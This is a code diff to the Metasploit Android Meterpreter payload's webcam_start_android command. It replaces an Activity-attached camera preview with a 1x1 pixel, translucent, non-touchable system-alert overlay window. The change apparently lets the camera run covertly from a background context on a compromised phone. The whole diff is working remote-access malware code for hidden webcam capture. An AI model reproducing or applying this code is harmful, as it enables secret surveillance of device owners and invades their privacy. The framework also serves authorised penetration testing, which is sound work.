@@ -1,15 +1,14 @@
 
 package com.metasploit.meterpreter.android;
 
-import android.app.Activity;
 import android.content.Context;
+import android.graphics.PixelFormat;
 import android.hardware.Camera;
 import android.os.Handler;
 import android.util.Log;
 import android.view.SurfaceHolder;
 import android.view.SurfaceView;
-import android.view.View;
-import android.view.ViewGroup;
+import android.view.WindowManager;
 
 import com.metasploit.meterpreter.AndroidMeterpreter;
 import com.metasploit.meterpreter.Meterpreter;
@@ -18,7 +17,6 @@ import com.metasploit.meterpreter.command.Command;
 import com.metasploit.meterpreter.stdapi.webcam_audio_record;
 
 import java.io.IOException;
-import java.lang.Override;
 import java.lang.reflect.Method;
 
 public class webcam_start_android extends webcam_audio_record implements Command {
@@ -74,9 +72,13 @@ public class webcam_start_android extends webcam_audio_record implements Command
                         }
                     });
                     surfaceHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
-                    Activity activity = (Activity)context;
-                    ViewGroup.LayoutParams layoutParams = new ViewGroup.LayoutParams(1, 1);
-                    activity.addContentView(surfaceView, layoutParams);
+                    WindowManager windowManager = (WindowManager)context.getSystemService(Context.WINDOW_SERVICE);
+                    WindowManager.LayoutParams params = new WindowManager.LayoutParams(1, 1,
+                            WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
+                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
+                            PixelFormat.TRANSLUCENT);
+                    windowManager.addView(surfaceView, params);
                 }
             });
 
